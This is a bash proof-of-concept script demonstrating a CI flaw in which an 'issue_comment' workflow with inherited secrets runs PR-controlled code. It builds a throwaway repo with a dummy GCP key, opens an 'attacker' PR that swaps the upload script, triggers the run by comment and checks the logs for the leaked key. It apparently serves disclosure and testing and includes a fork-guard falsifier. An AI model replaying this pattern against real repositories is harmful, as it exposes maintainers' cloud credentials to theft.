#!/usr/bin/env bash
# One-shot PoC driver. Creates a throwaway PUBLIC repo under the current gh account,
# sets a DUMMY secret, opens the attacker PR, then triggers the documented comment.
# Nothing here touches any third-party repo.
set -euo pipefail
REPO_NAME="${REPO_NAME:-ci-replica-poc}"
ACCT="$(gh api user --jq .login)"
FULL="$ACCT/$REPO_NAME"
DUMMY='{"type":"service_account","project_id":"poc-demo","private_key_id":"DUMMYKEYID","private_key":"-----BEGIN PRIVATE KEY-----\nDUMMY-NOT-A-REAL-KEY\n-----END PRIVATE KEY-----\n","client_email":"poc@poc-demo.iam.gserviceaccount.com"}'

echo "== 0/5 ensure a git repo with one commit"
if ! git rev-parse --git-dir >/dev/null 2>&1; then
  git init -q -b main
  git config user.email >/dev/null 2>&1 || git config user.email "poc@example.invalid"
  git config user.name  >/dev/null 2>&1 || git config user.name  "poc"
fi
git add -A
git diff --cached --quiet || git commit -qm "poc: replica of issue_comment + secrets:inherit"

echo "== 1/5 create $FULL"
VIS="${VIS:-private}"   # default private: no signal to the target, Actions still run
gh repo create "$REPO_NAME" --"$VIS" --source=. --push --description "CI PoC: issue_comment + secrets:inherit hands inherited secrets to PR-controlled code"

echo "== 2/5 set the dummy secret the workflow inherits"
gh secret set GCP_SERVICE_ACCOUNT_KEY -R "$FULL" --body "$DUMMY"

echo "== 3/5 attacker branch: swap one file"
git checkout -b feature/tidy-uploader
cp scripts/attacker_upload_test_results.py .github/scripts/upload_test_results.py
git commit -qam "test: tidy result uploader"
git push -q -u origin feature/tidy-uploader

echo "== 4/5 open the PR"
PR=$(gh pr create -R "$FULL" --fill --head feature/tidy-uploader | grep -oE '[0-9]+$' | tail -1)
echo "   PR #$PR"

echo "== 5/5 maintainer comment (the documented trigger)"
gh pr comment "$PR" -R "$FULL" --body "/run-integration"

echo "-- waiting for the run"
for i in $(seq 1 30); do
  id=$(gh run list -R "$FULL" --workflow integration.yml -L1 --json databaseId,status --jq '.[0].databaseId' 2>/dev/null || true)
  st=$(gh run list -R "$FULL" --workflow integration.yml -L1 --json status --jq '.[0].status' 2>/dev/null || true)
  [ "$st" = "completed" ] && break; sleep 10
done
echo "-- run $id"
gh run view "$id" -R "$FULL" --log | grep -E "LEAKED_KEY_B64|fork=|Upload Results" || true
echo
echo "Expected: LEAKED_KEY_B64=<base64 of the dummy secret> printed by the PR's own script."
echo "Falsifier: git apply falsifier/fork_guard.patch, push, re-trigger -> the line never appears."
